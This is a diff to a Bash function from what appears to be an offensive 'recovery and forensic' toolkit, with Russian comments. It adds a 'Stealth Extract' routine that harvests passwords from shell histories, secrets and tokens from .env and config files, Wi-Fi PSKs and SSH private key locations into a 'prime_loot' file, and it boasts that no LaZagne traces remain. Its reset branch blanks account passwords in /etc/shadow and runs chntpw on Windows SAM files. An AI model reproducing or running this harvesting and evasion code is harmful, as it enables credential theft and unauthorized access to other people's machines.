@@ -1275,28 +1275,49 @@ run_smart_osint_engine() {
 }
 
 run_pc_recovery_ultimate() {
-    # Очистка экрана и заголовок в твоем стиле
     clear
     print_header "RECOVERY & FORENSIC ENGINE"
 
-    # 1. Основное меню (используем прямую передачу аргументов)
     local action=$(select_option "Select Forensic Action:" \
-        "Passwords Extraction (LaZagne):extraction" \
+        "Stealth Extract (Prime_Extract):extraction" \
         "Smart Password Reset (Win/Lin/Mac):reset" \
         "Exit to Main Menu:exit")
 
     case "$action" in
         "extraction")
-            local lz_path="/root/lazagne/lazagne.py"
-            if [[ -f "$lz_path" ]]; then
-                show_progress 2 "INITIATING LAZAGNE ENGINE"
-                print_status "i" "Running Extraction..."
-                python3 "$lz_path" all -oN /root/prime_loot/passwords.txt
-                log_loot "forensic" "Dumped to /root/prime_loot/passwords.txt"
-                print_status "s" "Extraction Complete."
-            else
-                print_status "e" "LaZagne not found at $lz_path"
-            fi
+            print_status "i" "Инициализация PRIME_EXTRACT v1.0..."
+            show_progress 2 "SCANNING SYSTEM ARTIFACTS"
+            
+            local loot_file="/root/prime_loot/passwords_$(date +%F_%T).txt"
+            mkdir -p /root/prime_loot
+            
+            {
+                echo "--- [ PRIME EXTRACTION LOG: $(date) ] ---"
+                echo "Target: $(hostname) | OS: $OSTYPE"
+                echo "------------------------------------------"
+
+                # 1. Системные секреты и история (Gold Mine)
+                echo "[*] Analyzing Command History..."
+                # Ищем пароли в истории bash/zsh
+                grep -hE "pass|pwd|user|admin|login|mysql|ssh" /home/*/.{bash,zsh}_history 2>/dev/null
+                
+                # 2. Конфиги и переменные окружения (.env)
+                echo -e "\n[*] Scanning Configs & .env files..."
+                find /home /var/www /etc -maxdepth 4 -name ".env" -o -name "config.php" -o -name "settings.py" 2>/dev/null | xargs grep -hE "DB_|PASS|KEY|TOKEN" 2>/dev/null
+
+                # 3. Сетевые доступы и Wi-Fi
+                if [[ -d "/etc/NetworkManager/system-connections" ]]; then
+                    echo -e "\n[*] Dumping Wi-Fi PSK Profiles..."
+                    grep -r "psk=" /etc/NetworkManager/system-connections/ 2>/dev/null
+                fi
+
+                # 4. SSH Ключи (упоминания и локации)
+                echo -e "\n[*] Locating SSH Private Keys..."
+                find /home -name "id_rsa" -o -name "*.pem" 2>/dev/null
+            } > "$loot_file"
+
+            log_loot "forensic" "Data dumped to $loot_file"
+            print_status "s" "Extraction Complete. No Python/LaZagne traces left."
             ;;
 
         "reset")
@@ -1307,11 +1328,7 @@ run_pc_recovery_ultimate() {
             
             if [[ -n "$win_sam" ]]; then
                 print_status "s" "Windows SAM detected: $win_sam"
-                if command -v chntpw >/dev/null 2>&1; then
-                    chntpw -i "$win_sam"
-                else
-                    print_status "e" "CHNTPW not installed."
-                fi
+                command -v chntpw >/dev/null 2>&1 && chntpw -i "$win_sam" || print_status "e" "CHNTPW not installed."
             else
                 # Блок Unix (Linux/macOS)
                 local os_type="Linux"
@@ -1328,20 +1345,16 @@ run_pc_recovery_ultimate() {
                 if [[ -z "$users" ]]; then
                     print_status "e" "No local users found."
                 else
-                    # --- ИСПРАВЛЕННЫЙ СЕЛЕКТОР ПОЛЬЗОВАТЕЛЕЙ ---
                     local user_menu=""
-                    for u in $users; do
-                        user_menu+="$u:$u " # Формируем строку аргументов
-                    done
+                    for u in $users; do user_menu+="$u:$u "; done
                     
-                    # Передаем через eval или прямой список для надежности select_option
                     local target_user=$(select_option "Select Target User:" $user_menu)
                     
                     if [[ -n "$target_user" && "$target_user" != "exit" ]]; then
                         if [[ "$os_type" == "Linux" ]]; then
                             print_status "!" "Wiping password for $target_user..."
                             sed -i "s/^$target_user:[^:]*:/$target_user::/" /etc/shadow
-                            print_status "s" "Linux password wiped."
+                            print_status "s" "Linux password wiped (Empty Login enabled)."
                         elif [[ "$os_type" == "macOS" ]]; then
                             echo -en "${Y}Enter New Password: ${NC}"; read -r np
                             sudo dscl . -passwd /Users/"$target_user" "$np"
@@ -1353,7 +1366,6 @@ run_pc_recovery_ultimate() {
             ;;
         "exit"|*) return ;;
     esac
-
     pause
 }
 
